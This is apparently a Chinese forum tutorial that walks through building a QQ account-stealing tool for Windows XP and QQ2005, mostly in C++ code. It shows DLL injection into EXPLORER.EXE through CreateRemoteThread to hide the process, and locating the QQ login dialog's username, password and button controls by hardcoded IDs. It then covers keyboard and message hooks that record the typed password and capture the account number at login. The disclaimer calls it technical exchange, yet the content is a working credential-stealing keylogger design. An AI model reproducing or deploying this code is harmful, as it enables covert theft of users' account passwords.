
# [原创]QQ盗号的核心技术（简单版）

平台：windows xp sp2; 软件：QQ2005版。

申明：本文旨在技术交流。

## 一、先讲几句废话

经常有听到有朋友QQ被盗的消息，总感觉做出这种行为的人是可鄙的，不就是对QQ窗口进行监视，然后再是记录用户输入的号码和密码，认为没什么了不起。

对于Windows核心编程，本人还是一只菜鸟，前一段时间把《Windows系统编程》粗略的看一边（当然重点地方仔细的看），由于对于C++有点基础，感觉学起来比较容易上手。但到了这两天真正实践的时候，遇到了各种各样的问题。即使一个小小的问题都足以让我这只菜鸟郁闷老半天。直到此时，在完成这个软件的时候，整理一下思路，不但算是给自己个总结，也跟像我一样的菜鸟们分享一下自己的经验。

## 二、进入主题

想必大家都已经知道，这类软件的特点就是在用户不知不觉的时候工作。在任务管理器中是看不到它们的，这就是隐藏了进程。采用插入内核的嵌入方式、利用远程插入线程技术、嵌入DLL线程、或挂接`PSAPI`等都可以达到效果，哎，既然是个菜鸟就选择一个最简单的来做个实验。

先讲一下思路：需要三个进程A，B，C；两个DLL。

初始进程A，用于在进程B中创建远程线程，创建成功立即退出，不会留给任务管理器任何捕捉它的机会（你根本来不及观察）。

进程B作为远程线程的寄主，选择的时候应该是那些系统中必须执行的进程，比如`EXPLORER.EXE`。其中的远程线程用于监视目标进程。

进程C为目标进程在这里也就是`QQ.EXE`。

第一个DLL（`InspectQQLandDlg.dll`），远程线程的载体。

第二个DLL（`MyHook.dll`），全局钩子函数的载体。

现在要做是利用进程A把`InspectQQLandDlg.dll`映射到进程B，同时启动该DLL中的远程线程，再利用该线程监视目标进程（`QQ.EXE`）QQ登陆窗口，一旦找到，立即把`MyHook.dll`映射到目标进程来监视用户的输入。

这样也清楚了这个软件设计的总体构架，下面用代码来具体实现。

### 1. 远程线程的创建

先利用进程快照取得目标进程，相对比较简单

``` 
HANDLE hSnapshot ;

hSnapshot = CreateToolhelp32Snapshot ( TH32CS_SNAPPROCESS, 0 ) ;

if ( hSnapshot == INVALID_HANDLE_VALUE)

{
    return 0;
}

string lpName = "EXPLORER.EXE" ;    //设定需要监视的进程名

PROCESSENTRY32 pe;

pe.dwSize = sizeof ( PROCESSENTRY32 );

for( BOOL fOk = Process32First ( hSnapshot, &pe ) ; fOk;   fOk =
  Process32Next( hSnapshot, &pe ) )
{
  if ( pe.szExeFile == lpName )
  {
   //取得宿主进程（EXPLORER.EXE）的句柄
   HANDLE hRemoteProcess = OpenProcess ( PROCESS_ALL_ACCESS,
    false, pe.th32ProcessID ) ;
   //取得目标DLL的当前路径（路径可自由设置）
   char szInspectDllPath[128] ;
   GetCurrentDirectory ( 128, szInspectDllPath ) ;
   strcat ( szInspectDllPath, "\\debug\\InspectQQLandDlg.dll" ) ;
   //申请存放文件名的空间
   LPVOID pszInspectDllRemote ;
   int InspectDllNameLength = sizeof ( szInspectDllPath ) + 1 ;
   pszInspectDllRemote = VirtualAllocEx ( hRemoteProcess,
    NULL, InspectDllNameLength, MEM_COMMIT, PAGE_READWRITE ) ;
   //把dll文件名写入申请的空间
   WriteProcessMemory ( hRemoteProcess, pszInspectDllRemote,
    (LPVOID)szInspectDllPath, InspectDllNameLength, NULL);
   //获取动态链接库函数地址
   HMODULE hModule ;
   hModule = GetModuleHandle ( "kernel32.DLL" ) ;
   LPTHREAD_START_ROUTINE fnStartAddr ;
   fnStartAddr = ( LPTHREAD_START_ROUTINE ) GetProcAddress ( hModule,
    "LoadLibraryA" ) ;
   //创建远程线程
   HANDLE hInspectRemoteThread = NULL ;//存放远程线程句柄
   hInspectRemoteThread = CreateRemoteThread ( hRemoteProcess, NULL, 0,
    fnStartAddr, pszInspectDllRemote, 0, NULL ) ;
   if( hSnapshot != NULL )
    CloseHandle ( hSnapshot ) ;//关闭进程快照
   CloseHandle ( hRemoteProcess ) ;
   break ;
  }
}
```

### 2. 映射 `InspectQQLandDlg.DLL` 到 `EXPLORER.EXE`

此时 `InspectQQLandDlg.DLL` 已经被映射到 `EXPLORER.EXE`。此时在 `InspectQQLandDlg.DLL` 的 `DllMain`（千万不要写成 `DLLMain`）中接受到 `DLL_PROCESS_ATTACH` 消息，但一般来说不因在 `DllMain` 中执行过多的功能（借鉴前人的经验，嘿嘿），于是很容易想到开辟一个新线程。

``` 
switch(fdwReason)
{
  case DLL_PROCESS_ATTACH:
  {
   //下面这句会给你创建远程线程成功的提示。
   MessageBox ( 0, "Code Injection success!", "NOTE", MB_OK ) ;
   HANDLE hNewThread = CreateThread ( NULL, 0,ThreadForInspect, NULL, 0, 0 ) ;
   break;
  }
}
```

在新线程中要达到的目标只是一个循环，利用 `while()` 和循环标志 `(BOOL)isContinue` 即可以实现。

在这个远程线程中要完成的第二个任务是找到QQ登陆对话框中关键控件。

关于这点网上有很多资料，利用的是`FindWindow`和`FindWindowEx`，这是针对以前的版本。在这里已经无效了，现在QQ在这里下了点工夫，采用的是窗口标题采用随机字符。

就以登陆对话框为例，对话框的类为`"#32770"`，或许许多菜鸟朋友会像我在最初的时候一样，傻傻用`FindWindow ("QQ用户登陆","#32770") ;`结果什么都没有，哎~~

其实可以通过窗口枚举搞清楚QQ在这里到底做了什么手脚。

``` 
BOOL CALLBACK EnumWindowProc ( HWND hwnd, LPARAM lParam )
{
if ( !hwnd )
{
  return false ;
}
char szWindowName[128] ;
ZeroMemory ( szWindowName, 128 ) ;
GetClassName ( hwnd, szWindowClassName, 128 ) ;//取得类名
if ( !strcmp ( szWindowClassName, "#32770" ) )
{
   __asm int 3
}
return true ;
}
```

利用上面的程序段，在VC调试器中不断按F5且同时在WATCH中观察`szWindowName`，很容易发现这个窗口名字符串是由不超过二十个字符组成（多次观察），但其中的元素只有`0X13`，`0X10`，`0X32`，字符串中的每个位置都是三个元素之一。但在SPY++中窗口名中看起来只不过是“  ”，怎么看都只是几个空格（再提醒一下，不要试图通过复制其中的内容，效果可是无法忍受的，呵呵）

事实上登陆窗口可以通过窗口的许多确定因素来确定，比如窗口风格，窗口ID之类的，这些都可以通过SPY++轻易得到（SPY++，好东西啊），下面也就不多发话了，直接给出各个关键控件的代码。

``` 
#define UserNameComboBoxId 0x0000008A   //用户名控件ID
#define PasswordEditId     0x000000B4   //密码控件ID
#define ButtonId           0x00003EA0   //登陆按扭控件ID
#define QQLandDlgMiniStyle 0x94CA00C4   //登陆对话框最小化时的风格
#define QQLandDlgShowStyle 0XB4CA00C4   //登陆对话框在桌面显示时的风格

BOOL CALLBACK EnumWindowProc ( HWND hwnd, LPARAM lParam )
{
if ( !hwnd )
  return false ;
long style = GetWindowLong ( hwnd, GWL_STYLE ) ;
if (  style == QQLandDlgMiniStyle || style == QQLandDlgShowStyle )
{
  hQQLand = hwnd ;
  EnumChildWindows ( hQQLand, EnumChildWndProc, NULL ) ;
  return false ;
}
return true ;
}

BOOL CALLBACK EnumChildWndProc ( HWND hwnd, LPARAM lParam )
{
if ( !hwnd )
  return false ;
//取得指定句柄的控件ID
long  id= GetWindowLong ( hwnd, GWL_ID ) ;
if (id == UserNameComboBoxId )
{
  hUserName = hwnd ;
}
else if ( id == PasswordEditId )
{
  hPassword = hwnd ;
}
else if ( id == ButtonId )
{
  hLandButton = hwnd ;
}
return true ;
}
```

到这里终于取得盼望多时的`hUserName`、`hPassword`、`hButton`这三个控件的句柄。~v~

在这里其实可以用 `SendMessage ( hUserName, WM_GETTEXT, 128, (LPARAM)szUserName );` 取得`UserName`(QQ号码），但不能取得密码。

可以随便下载个\*号密码，再在密码框中输入几个字符，结果可能是失败，不知道QQ做了什么手脚，有机会再好好研究。既然此路不通，菜鸟也自己的办法去达到目标。

现在远程线程的第二个功能（取得关键控件的句柄）已经完成，接下来要做的事是把`MyHook.dll`映射到`QQ.EXE`，这样即可实现对用户键盘输入的监视。

只需调用`MyHook.dll`的接口函数即可：`SetHook ( hQQLand, hUserName, hPassword, hLandButton, true ) ;`

### 3. `MyHook.dll` 模块

``` 
EXPORT BOOL WINAPI SetHook ( HWND hQQLand,
    HWND hUserName, HWND hPassword, HWND hLandButton, BOOL isInstall )
{
if ( isInstall )
{
  hQQLandDlg = hQQLand ;
  hUserNameEdit = hUserName ;
  hPasswordComboBox = hPassword ;
  hButton = hLandButton ;
  DWORD dwQQLandDlgThreadId = GetWindowThreadProcessId ( hQQLand, NULL ) ;
  hHookDll = GetModuleHandle ( "MyHook" ) ;
  hKeyboard = SetWindowsHookEx ( WH_KEYBOARD,
   (HOOKPROC)KeyboardProc, hHookDll, dwQQLandDlgThreadId ) ;
  hWndProc = SetWindowsHookEx ( WH_CALLWNDPROC,
   (HOOKPROC)CallWndProc, hHookDll, dwQQLandDlgThreadId ) ;
   if ( hKeyboard != NULL && hWndProc != NULL )
   return true ;
}
else
{
  UnhookWindowsHookEx ( hKeyboard ) ;
  UnhookWindowsHookEx ( hWndProc ) ;
  hHookDll = NULL ;
  hKeyboard = NULL ;
  hWndProc = NULL ;
  ZeroMemory ( szPassword, 128 ) ;
  pszPasswordLen = 0 ;
}
return false ;
}
```

这个程序段很简单只是通过检测远程线程的输入安装、卸载钩子函数。

如果对钩子函数不清楚的朋友，看一下MSDN或者WIN32函数集就可以了。

这里对QQ登陆对话框线程设置两个钩子，一个键盘钩子函数记录键盘输入；另一个全局消息钩子。

``` 
LRESULT CALLBACK KeyboardProc ( int nCode, WPARAM wParam, LPARAM lParam )
{
//检测回车键是否被按下
if ( wParam == VK_RETURN && lParam > 0 )
{
  //由于钩子函数只是记录对密码框的记录，因而在最后时刻取得号码会是准确的
  SendMessage ( hUserNameEdit, WM_GETTEXT, 128, (LPARAM)szUserName );
  //此处可以自由处理拦截到的号码和密码（szUserName,szPassword）
  //不要忘了变量还原（szUserName,szPassword）
}
if ( lParam > 0 && wParam != VK_RETURN )
{
  char KeyName[10] ;
   ZeroMemory ( KeyName, 10 ) ;
  GetKeyNameText ( lParam, KeyName, 10 ) ;
  if ( strlen ( KeyName ) == 1 )
  {
   strcat ( szPassword, KeyName ) ;
   }
}
return CallNextHookEx ( hKeyboard, nCode, wParam, lParam ) ;
}
```

也由一部分用户是用鼠标点击登陆按扭的，可由下面代码实现

``` 
LRESULT CALLBACK CallWndProc ( int nCode, WPARAM wParam, LPARAM lParam )
{
CWPSTRUCT *p = (CWPSTRUCT*)lParam ;
if ( p->message == WM_COMMAND && p->hwnd == hButton )
{//同理
  SendMessage ( hUserNameEdit, WM_GETTEXT, 128, (LPARAM)szUserName );
  //这里可添加如何处理密码的语句
  }
return CallNextHookEx ( hWndProc, nCode, wParam, lParam ) ;
}
```

上面给出的几段代码可以实现基本的号码和密码记录功能，但对于具体细节的处理（比如用户按退格键或是其他），这些只要考虑仔细就可以了没有什么难度，这里就不说了。

到此，我想应该把核心部分讲清楚了。由于时间比较紧，写的比较仓促，难免有不足之处，请各位多指教。

哎~~，期末又来了，讨厌，我的身心又要遭受摧残，各位朋友为我祈祷，祝福我顺利PASS吧

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
